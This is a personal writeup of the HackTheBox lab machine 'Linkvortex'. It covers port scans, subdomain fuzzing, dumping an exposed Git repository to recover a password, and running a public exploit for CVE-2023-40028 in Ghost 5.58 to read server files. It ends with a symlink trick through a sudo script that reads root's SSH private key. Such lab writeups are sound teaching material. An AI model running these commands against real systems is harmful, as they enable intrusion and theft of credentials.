---
title: "Linkvortex - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Linkvortex
![](https://kar0nx.github.io/assets/images/writeup/97f12db8fafed028448e29e30be7efac.png)
## Reconnaissance

IP: 10.10.11.47
## NMAP

```
nmap -T4 -p- -A 10.10.11.47
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 07:15 UTC
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-server-header: Apache
|_http-title: BitByBit Hardware
|_http-generator: Ghost 5.58
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   29.48 ms 10.10.14.1
2   29.62 ms linkvortex.htb (10.10.11.47)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.30 seconds
```

add to /etc/hosts linkvortex.htb
## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911091545.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911091656.png)

in nmap scan and in /robots.txt we see 4 directories
/ghost is login panel

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911092836.png)

Tried to login with default but doesn't work, however I notice that `admin@linkvortex.htb` exist cause I got message about incorect password and my other tries got error 'There is no user with that email address. '

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911112051.png)

also found subdomain dev but nothing special here for now

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -fs 230
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911093241.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911093225.png)

scan new subdomain with nmap and we see that Git repository found

```
nmap -T4 -A  dev.linkvortex.htb -p80,443
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 08:41 UTC
Nmap scan report for dev.linkvortex.htb (10.10.11.47)
Host is up (0.031s latency).
rDNS record for 10.10.11.47: linkvortex.htb

PORT    STATE  SERVICE VERSION
80/tcp  open   http    Apache httpd
|_http-title: Launching Soon
|_http-server-header: Apache
| http-git: 
|   10.10.11.47:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/TryGhost/Ghost.git
443/tcp closed https
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   29.99 ms 10.10.14.1
2   30.52 ms linkvortex.htb (10.10.11.47)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds

```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911105446.png)

## Git-dumper

```
git-dumper http://dev.linkvortex.htb/.git/ /root/Desktop/link
```

great now we have git repository dumped on our machine, I always start with git log

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911110019.png)

Can't find anything use full so I searched google for TryGhost config files.
https://docs.ghost.org/config
Reading documentation I found interesting file config.production.json

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911110617.png)

nothing just default
Then I remembered that I forgot about checking status and viola

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911111108.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911111426.png)

```
test@example.com  OctopiFociPilfer45
```

and not working, tried firstly found `admin@linkvortex.htb` and I logged it

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911112309.png)

Googling I found cve-2023-40028 
https://www.exploit-db.com/exploits/52409
Poc: https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028

```
./CVE-2023-40028 -h http://linkvortex.htb -u admin@linkvortex.htb -p 'OctopiFociPilfer45'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911130353.png)

Now let's search for config.production.json that I found information about earlier, googling I found 2 path and correct was /var/lib/ghost/config.production.json

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911130343.png)

bob fibber-talented-worth
now we can connect via ssh and grab first flag

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911130630.png)

## Privilege Escalation

Starting with sudo -l 
we can run sudo with custom script and interesting is that env_keep is set to CHECK_CONTENT

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911130914.png)

Let's analyze the code, most important is that we pass argument and if condition checking is file .png. IF contains etc root print warning. I correct move file to /var/quarantined

```
ln -s /root/.ssh/id_rsa /home/bob/.cache/b
ln -s /home/bob/.cache/b /home/bob/.cache/a.png
CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911131451.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911131426.png)

## Adds 

Later when I watched IppSec I should check for Dockerfile.ghost file after git-dump

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911142946.png)

also is easier to search for changes in git with 

```
git diff --cached ghost/core/test/regressuib/api/admin/authentication.test.js
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250911143308.png)